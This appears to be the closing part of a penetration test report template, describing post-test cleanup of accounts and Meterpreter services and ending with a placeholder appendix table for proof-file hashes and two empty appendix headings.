
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting data from the network was completed, I removed all user accounts and passwords as well as the Meterpreter services installed on the system. the client should not have to remove any user accounts or services from the system.

## Additional Items

### Appendix - Proof and Local Contents:

| IP (Hostname) | Local.txt Contents | Proof.txt Contents |
| ------------- | ------------------ | ------------------ |
| x.x.x.x       | hash\_here         | hash\_here         |

### Appendix -&#x20;

### Appendix -
